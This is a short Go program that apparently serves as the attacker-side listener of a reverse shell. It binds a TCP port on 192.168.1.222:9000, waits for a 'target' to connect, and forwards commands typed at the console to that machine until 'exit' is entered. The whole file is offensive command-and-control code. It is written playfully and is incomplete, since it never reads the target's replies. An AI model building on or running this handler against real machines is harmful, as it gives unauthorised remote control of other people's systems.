package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

const(
	Network = "tcp"
	Address = "192.168.1.222:9000"
)

//get connection with shell and issue command
func connect(conn net.Conn)string{
	buf := make([]byte,1024) //write

	read :=bufio.NewReader(os.Stdin)
	buf,err := read.ReadBytes('\n')
	if err!= nil {
		fmt.Fprintln(os.Stderr,err)
	}

	conn.Write(buf)

	return string(buf[:])
}

func main(){

	listen,err := net.Listen(Network,Address)
	if err != nil {
		fmt.Println("error tcp! err:",err)
	}
	defer listen.Close()


	fmt.Println("Try to connect...")
	conn,err :=listen.Accept()
	defer conn.Close()
	if err != nil{
		fmt.Println("Accept err! err",err)
	}

	fmt.Println("Connect Success！")
	fmt.Println("The target'adress is：",conn.RemoteAddr())
	fmt.Println("All right")
	fmt.Printf("$ ")

	buf := connect(conn)
	for {
		buf = strings.TrimSpace(buf)
		if buf == "exit"{
			fmt.Println("Experience +3 ByeBye~")
			break
		}
		fmt.Printf("$ ")
		buf = connect(conn)
	}

}